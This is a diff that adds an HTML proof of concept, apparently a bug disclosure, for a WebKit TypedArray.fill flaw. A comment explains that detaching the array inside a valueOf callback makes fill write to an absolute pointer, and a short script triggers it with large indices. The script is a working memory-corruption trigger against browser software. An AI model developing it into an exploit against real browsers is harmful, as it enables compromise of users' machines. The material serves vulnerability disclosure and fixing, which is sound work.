@@ -1,0 +1,60 @@
+<!--
+There is a bug in TypedArray.fill that can be used to write to an absolute pointer. 
+
+In JavaScriptCore/runtime/JSGenericTypedArrayViewPrototypeFunctions.h, the function genericTypedArrayViewProtoFuncFill contains the following code:
+
+    unsigned length = thisObject->length();
+    unsigned begin = argumentClampedIndexFromStartOrEnd(exec, 1, length);
+    unsigned end = argumentClampedIndexFromStartOrEnd(exec, 2, length, length);
+
+    if (end < begin)
+        return JSValue::encode(exec->thisValue());
+
+    if (!thisObject->setRangeToValue(exec, begin, end, valueToInsert))
+        return JSValue::encode(jsUndefined());
+
+argumentClampedIndexFromStartOrEnd will call valueOf on a parameter to the fill function, which can contain a function that neuters the this array, causing the pointer used by setRangeToValue to be null. However, the begin and end variables can be very large values, up to 0x7fffffff, which could be valid pointers on ARM and 32-bit platforms. This allows an absolute pointer in this range to be written to.
+
+An HTML file demonstrating this issue is attached. This issue affects Safari Technology Preview and WebKit, but has not made it into production Safari yet (TypedArray.fill is not supported).
+
+Note that there are three places that code can be excuted after the neutered check in this function, the begin and end parameter, and the value, which is converted in setRangeToValue. To fix this issue, a check needs to be performed after the value has been converted.
+-->
+
+<html>
+<body>
+<script>
+
+function f(){
+   try{
+   alert("t");
+   postMessage("test", "http://127.0.0.1", [q])
+   alert(a.byteLength);
+   alert(q.byteLength);
+  } catch(e){
+     alert(e.message);
+   alert(a.byteLength)
+   alert(q.byteLength);
+  }
+   return 0x12345678;
+}
+
+alert(Date);
+
+var q = new ArrayBuffer(0x7fffffff);
+var o = {valueOf : f}
+var a = new Uint8Array(q);
+
+  // alert(q.byteLength);
+var t = [];
+
+try{
+    a.fill(0x12, o, 0x77777777);
+} catch(e){
+
+    alert(e.message);
+
+}
+
+</script>
+</body>
+</html>
